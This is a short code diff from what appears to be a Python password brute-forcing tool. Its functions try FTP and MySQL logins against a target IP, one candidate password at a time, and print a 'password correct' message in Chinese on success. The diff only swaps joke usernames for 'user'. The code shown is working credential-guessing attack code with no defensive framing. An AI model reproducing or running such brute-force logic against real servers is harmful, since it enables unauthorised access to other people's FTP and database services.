@@ -43,7 +43,7 @@ def _ftp_try(line, ip):
     ftp = FTP()
     ftp.connect(ip, 21)
     try:
-        ftp.login("woshidaheike", line)
+        ftp.login("user", line)
         print(line + "密码正确"+"\n")
         ftp.close()
         return True
@@ -128,7 +128,7 @@ async def async_mysql(ip):
             print(f"处理mysql任务出错: {e}")
 def _mysql_try(line, ip):
     try:
-        conn = pymysql.connect(host=ip, port=3306, user="我是真的帅", password=line, charset='utf8')
+        conn = pymysql.connect(host=ip, port=3306, user="user", password=line, charset='utf8')
         print(line + "密码正确"+"\n")
         conn.close()
         return True
